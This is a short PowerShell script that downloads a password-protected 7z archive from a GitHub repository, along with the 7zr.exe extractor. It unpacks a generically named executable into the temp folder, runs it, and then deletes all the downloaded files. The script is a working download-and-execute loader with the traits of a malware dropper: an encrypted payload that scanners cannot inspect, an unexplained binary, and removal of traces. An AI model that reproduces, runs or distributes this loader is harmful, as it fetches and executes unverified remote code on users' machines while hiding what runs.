# Prompt for the password for the RAR file (masked input)
$securePassword = Read-Host -Prompt "Enter the password for the RAR file" -AsSecureString
$rarPassword = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($securePassword))

# Temporary paths
$tempFolder = [System.IO.Path]::Combine($env:TEMP, "temp_folder")
$tempRar = [System.IO.Path]::Combine($env:TEMP, "sarpili.7z")
$temp7zr = [System.IO.Path]::Combine($tempFolder, "7zr.exe")
$extractedFile = [System.IO.Path]::Combine($tempFolder, "temp_executable.exe")

# URLs
$rarDownloadUrl = "https://raw.githubusercontent.com/voidelixir/sarpili/main/sarpili.7z" # Update the RAR file URL
$sevenZipExeUrl = "https://7-zip.org/a/7zr.exe" # 7zr.exe tool for extracting

# Ensure the temporary folder exists
if (-Not (Test-Path -Path $tempFolder)) {
    New-Item -ItemType Directory -Path $tempFolder | Out-Null
}

# Step 1: Download the RAR file from GitHub
Write-Host "Downloading the RAR file..."
Invoke-RestMethod -Uri $rarDownloadUrl -OutFile $tempRar

# Step 2: Download 7zr.exe to the temp folder
Write-Host "Downloading 7zr.exe for extraction..."
Invoke-RestMethod -Uri $sevenZipExeUrl -OutFile $temp7zr

# Step 3: Extract the RAR file using 7zr.exe and the provided password
Write-Host "Extracting the RAR file..."
Start-Process -FilePath $temp7zr -ArgumentList "x `"$tempRar`" -p$rarPassword -o`"$tempFolder`" -y" -NoNewWindow -Wait

# Step 4: Run the extracted executable file
if (Test-Path -Path $extractedFile) {
    Write-Host "Executing the extracted file..."
    Start-Process -FilePath $extractedFile -Wait
} else {
    Write-Host "Error: Extracted file not found!"
}

# Step 5: Clean up temporary files and folders
Write-Host "Cleaning up temporary files..."
Remove-Item -Path $tempRar -Force
Remove-Item -Path $temp7zr -Force
Remove-Item -Path $tempFolder -Recurse -Force
Write-Host "All temporary files have been removed."
